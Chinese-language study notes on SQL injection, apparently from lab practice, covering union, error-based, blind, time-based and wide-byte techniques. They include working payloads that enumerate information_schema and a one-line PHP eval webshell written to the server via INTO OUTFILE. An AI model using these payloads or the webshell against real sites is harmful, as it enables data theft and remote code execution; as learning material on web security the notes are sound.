# SQL注入

#### 数字型

`SELECT first_name, last_name FROM users WHERE user_id ={$id}`

1. 用#注释掉后面的内容，避免语法错误

2. order by排列

   `SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1;`

   > 查询users表中user_id为1的数据并==按第一字段排行==
   >
   > > 可以用于判断总列数

3. union联合查询

   >用于合并两个或多个 SELECT 语句的结果集。
   >
   >UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。
   >
   >
   >
   >默认地，UNION 操作符选取不同的值。如果允许重复的值，使用 UNION ALL。
   >
   >
   >UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。

4. `database()`

   > 返回当前网站所使用的数据库名字

5. `user()`

   > 返回执行当前查询的用户名

6. `version()`

   > 获取当前数据库版本

7. `@@version_compile_os`

   > 获取当前操作系统。

`information_schema `是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。

该数据库拥有一个名为`tables`的数据表，该表包含两个字段` table_name `和` table_schema`，分别记录 DBMS 中的存储的表名和表名所在的数据库。



***

write up

1. 输入 1 and 1=1，and 1=2判断为数字型

2. order by 确认字段数为2

3. union select database() ,user()

   >返回当前网站所使用的数据库名字.
   >user()将会返回执行当前查询的用户名

4. `1 union select table_name,table_schema from information_schema.tables where table_schema='pikachu'`



#### 字符型

`SELECT first_name, last_name FROM users WHERE user_id = '$id' ;`

#### 搜索型

`$sql="select * from user where password like '%$pwd%' order by password";`

#### 报错注入

##### 三种常见的报错注入

###### 主键重复

* floor()

  > floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分

  * `GROUP BY`语句用于==结合合计函数==，根据一个或多个列对结果集进行分组。
    * `GROUP BY column_name`
  * `COUNT(column_name) `函数返回指定列的值的数目（NULL 不计入）
    * `COUNT(*) `函数返回表中的记录数
    * `COUNT(DISTINCT column_name) `函数返回指定列的不同值的数目
  * `rand()`函数生成0~1之间的随机数，可以给定一个随机数的种子
    * 查询的时候如果使用rand()的话，该值会被计算多次
    * 在==使用group by的时候==，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，==插入虚表的时候==会再被执行一次
    * 整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。

  `select count(),(concat(floor(rand(0)*2)),(select version()))) x from users group by x`

  * x是别名

  > 报错的原因：主要是因为虚拟表的主键重复
  >
  > 
  >
  > `1'and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a))#`
  > 嵌套查询原因：里面的查询结果是一个虚拟表，所以需要外套一个查询语句。

###### xpath语法错误

* updatexml()
  * `updatexml(xml_document,xpath_string,new_value)`
    * `new_value`是string格式，替换查找到的负荷条件的数据
    * 第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里
* extractvalue()
  * `extractvalue(xml_document,Xpath_string)`
    * `xml_document`是string格式，为xml文档对象的名称
    * `Xpath_string`是xpath格式的字符串
  * 第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里
  * `pyload：id='and(select extractvalue("anything",concat('~',(select语句))))`
    * `~`可以换成`#`、`$`等不满足xpath格式的字符
    * `extractvalue()`能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用`substring()`函数截取或limit分页，一次查看最多32位

##### 利用insert和update进行注入

* insert

  ~~~sql
  INSERT INTO table_name
  VALUES (value1,value2,value3,...);
  
  INSERT INTO table_name (column1,column2,column3,...)
  VALUES (value1,value2,value3,...);
  ~~~

* update

  ~~~sql
  UPDATE table_name
  SET column1=value1,column2=value2,...
  WHERE some_column=some_value;
  ~~~

> 注意：注入时insert需要闭合括号，而update不需要

##### 利用http请求头进行注入

例如user-agent，cookie等



#### 盲注

| 函数                     | 作用                                                         |
| ------------------------ | ------------------------------------------------------------ |
| length()                 | 返回字符串的长度                                             |
| select length(databse()) | 返回数据库名的长度                                           |
| substring()              | 截取字符串，可指定开始的位置和截取的长度                     |
| mid()                    | 截取字符串                                                   |
| substr()                 | 截取字符串                                                   |
| ord()                    | 返单个字符的Ascii码                                          |
| ascii()                  | 返回字符的ascii码                                            |
| char()                   | 将Ascii码转换成对应的字符                                    |
| sleep(n)                 | 将程序挂起一段时间，n为n秒                                   |
| if(expr1,expr2,expr3)    | 判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句 |

> `select substring(database(),1,1)`
>
> `select ord(substring(database(),1,1))`
>
> `select char(116);`

##### 布尔盲注

盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False

##### 时间盲注

* 代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息
* 语句执行后也不提示真假，不能通过页面的内容来判断
* 可以通过构造语句，通过页面响应的时长，来判断信息

通过`if(expr1,expr2,expr3)`和`sleep()`组合进行构造

e.g.`if(ascii(substr(database(),1,1)>115,0,sleep(5))%23`

#### 宽字节注入

宽字节：两个以上的字节

宽字节注入产生的原因：==各种字符编码的不当操作==，使得攻击者可以通过宽字节编码绕过SQL注入防御。

#### mysql select into outfile命令

在mysql数据库中存在mysql `select into outfile`命令，该命令与`load data infile`命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）

但是，需要注意的是：`into outfile`和`load_file()`两种方式的利用都是具有局限性的。

into outfile的使用前提是：

1.要知道网站的绝对路径（可以通过报错信息、phpinfo界面、404界面等一些方式知道）

2.要有file权限，默认情况下只有root权限有

3.对目录要有写权限，一般image之类的存放图片的目录有写权限

> 写的文件名一定是在网站中==不存在==的，不然也会不成功

##### select …… into outfile 'filename'常见的利用方式：

1.直接写进文件里

`select version() into outfile "绝对路径"`，其中version()可以换成其余的查询数据库信息的函数

2.修改文件结尾

`select "<?php @eval($_POST['cmd']);?>" into outfile "xxx/test.php"`，这里需要获取到网站在系统中的具体路径(绝对路径)

##### 一句话木马

通过GET 、POST 、COOKIE这三种方式向一个网站提交数据，一句话木马用`$_GET[' ']`、`$_POST[' ']`、`$_COOKIE[' '] `接收我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令。\

所以看到的经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分。

例如：`<?php eval(@$_POST['a']); ?>`

> 其中`eval`就是执行命令的函数，`$_POST['a']`就是接收的数据。`eval`函数把接收的数据当作PHP代码来执行。

##### webshell

> Webshell是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限

###### 常用PHP函数

* system()

  将命令作为参数，并输出结果

* 



参考

[mysql注入之into outfile](https://www.freebuf.com/articles/web/275874.html)

[PHP一句话木马之小马](https://www.jianshu.com/p/90473b8e6667)

[一文详解webshell](https://www.freebuf.com/articles/web/235651.html)